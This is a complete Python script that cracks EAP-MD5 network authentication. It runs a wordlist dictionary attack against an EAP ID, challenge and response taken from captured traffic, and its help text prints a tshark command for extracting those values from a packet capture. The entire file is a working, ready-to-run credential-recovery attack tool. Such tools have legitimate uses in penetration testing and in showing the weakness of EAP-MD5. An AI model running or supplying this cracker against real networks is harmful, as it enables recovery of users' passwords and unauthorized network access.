#!/usr/bin/env python3
import hashlib
import sys
import argparse

def crack_eap_md5(eap_id, challenge, response, wordlist):
    print(f"Starting EAP-MD5 crack attempt...")
    print(f"EAP ID: {eap_id} (0x{eap_id:02x})")
    print(f"Challenge: {challenge}")
    print(f"Response:  {response}")
    print(f"Wordlist:  {wordlist}")
    print(f"Algorithm: MD5(EAP_ID + password + challenge)")
    print("-" * 60)
    
    eap_id_byte = bytes([eap_id])
    challenge_bytes = bytes.fromhex(challenge)
    response_bytes = bytes.fromhex(response)
    
    print(f"EAP ID byte: {eap_id_byte.hex()}")
    print(f"Challenge bytes length: {len(challenge_bytes)}")
    print(f"Response bytes length: {len(response_bytes)}")
    print("-" * 60)
    
    try_count = 0
    
    try:
        with open(wordlist, 'r', encoding='latin-1', errors='ignore') as f:
            for line in f:
                try_count += 1
                password = line.strip().encode('latin-1')
                
                # MD5(ID + password + challenge)
                hash_input = eap_id_byte + password + challenge_bytes
                computed = hashlib.md5(hash_input).digest()
                
                if try_count % 10000 == 0:
                    print(f"Tried {try_count} passwords... Current: {password.decode('latin-1', errors='ignore')[:20]}")
                
                if computed == response_bytes:
                    print(f"SUCCESS! Found after {try_count} attempts")
                    return password.decode('latin-1', errors='ignore')
    except FileNotFoundError:
        print(f"Error: Wordlist file '{wordlist}' not found")
        return None
        
    print(f"Finished trying {try_count} passwords - not found in wordlist")
    return None

def main():
    print("EAP-MD5 Challenge/Response Cracker")
    print("=" * 40)
    print("First, capture EAP-MD5 packets using:")
    print("tshark -r file.cap -Y \"eap.type == 4\" -T fields -e frame.number -e eap.code -e eap.id -e eap.md5.value")
    print()
    print("Look for pairs where:")
    print("- Code 1 = Challenge (from AP)")  
    print("- Code 2 = Response (from client)")
    print("- Same EAP ID = matching chal/resp")
    print("=" * 40)
    print()
    
    parser = argparse.ArgumentParser(description='Crack EAP-MD5 authentication from captured challenge/response')
    parser.add_argument('eap_id', type=int, help='EAP ID from packet (required)')
    parser.add_argument('challenge', help='Challenge value (hex string)')
    parser.add_argument('response', help='Response value (hex string)')
    parser.add_argument('wordlist', help='Path to wordlist file')
    
    args = parser.parse_args()
    
    if not (0 <= args.eap_id <= 255):
        print("Error: EAP ID must be between 0-255")
        sys.exit(1)
    
    try:
        challenge_bytes = bytes.fromhex(args.challenge)
        response_bytes = bytes.fromhex(args.response)
        if len(challenge_bytes) != 16 or len(response_bytes) != 16:
            print("Error: Challenge and response must be 16 bytes each")
            sys.exit(1)
    except ValueError:
        print("Error: Challenge and response must be valid hex strings")
        sys.exit(1)
    
    result = crack_eap_md5(args.eap_id, args.challenge, args.response, args.wordlist)
    if result:
        print(f"\n*** PASSWORD FOUND: {result} ***")
        sys.exit(0)
    else:
        print("\n*** PASSWORD NOT FOUND ***")
        sys.exit(1)

if __name__ == "__main__":
    main()